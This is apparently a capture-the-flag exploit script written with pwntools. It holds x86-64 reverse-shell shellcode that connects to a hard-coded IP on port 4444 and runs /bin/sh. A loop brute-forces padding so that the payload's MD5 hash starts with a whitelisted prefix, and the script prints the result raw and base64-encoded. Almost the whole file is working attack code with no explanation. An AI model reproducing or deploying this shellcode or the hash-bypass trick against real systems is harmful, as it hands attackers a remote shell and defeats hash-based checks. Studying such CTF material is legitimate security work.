from pwn import *
from hashlib import md5
import base64

# Only the first element is checked.
valid_shells_md5 = ['79fc008108a92bcd7edb7cb63ea714b3'
# '1dee320bd66fde128e2ee875c7cc548c',
# 'f49de57a9723e4d8168e5b35a35aa3cd'
]

valid_shell_stub = '79fc00'

#testsh = b'\xbf\x32\x00\x00\x00\xb8\x00\x00\x00\x00\xbb\x01\x00\x00\x00\x48\x01\xd8\x48\x89\xc1\x48\x89\xd8\x48\x89\xcb\x48\xff\xcf\x75\xef\xc3'
#print(md5(testsh).hexdigest())
#print(md5(testsh).hexdigest() in valid_shells_md5)
#input()


shellcode = b'\x48\x31\xd2\x48\xc7\xc6\x01\x00\x00\x00\x48\xc7\xc7\x02\x00\x00\x00\x48\xc7\xc0\x29\x00\x00\x00\x0f\x05\x68\x92\xe9\x0b\x3e\x66\xbb\x5c\x11\x53\x66\xbb\x02\x00\x53\x48\x89\xe6\x48\xc7\xc2\x10\x00\x00\x00\x48\x89\xc7\x50\x48\xc7\xc0\x2a\x00\x00\x00\x0f\x05\x5f\x48\xc7\xc6\x02\x00\x00\x00\x48\xc7\xc0\x21\x00\x00\x00\x0f\x05\x48\xff\xce\x48\xc7\xc0\x21\x00\x00\x00\x0f\x05\x48\xff\xce\x48\xc7\xc0\x21\x00\x00\x00\x0f\x05\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x48\x89\xe7\x48\x31\xd2\x52\x57\x48\x89\xe6\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05'
result = b"H1\xd2H\xc7\xc6\x01\x00\x00\x00H\xc7\xc7\x02\x00\x00\x00H\xc7\xc0)\x00\x00\x00\x0f\x05h\x92\xe9\x0b>f\xbb\\\x11Sf\xbb\x02\x00SH\x89\xe6H\xc7\xc2\x10\x00\x00\x00H\x89\xc7PH\xc7\xc0*\x00\x00\x00\x0f\x05_H\xc7\xc6\x02\x00\x00\x00H\xc7\xc0!\x00\x00\x00\x0f\x05H\xff\xceH\xc7\xc0!\x00\x00\x00\x0f\x05H\xff\xceH\xc7\xc0!\x00\x00\x00\x0f\x05h/sh\x00h/binH\x89\xe7H1\xd2RWH\x89\xe6H\xc7\xc0;\x00\x00\x00\x0f\x05ce903b19197ee9294707c24799aa1811"

garbage = b'aaaaaaaa'

while True:
    garbage = bytes(md5(garbage).hexdigest().encode('ascii'))

    x = md5(shellcode+garbage).hexdigest()
    #print(x)
    if (x[:6] == valid_shell_stub):
        print(shellcode+garbage)
        print(bytes(shellcode+garbage))
        print(base64.b64encode(bytes(shellcode+garbage)))
        print(x)
        exit()
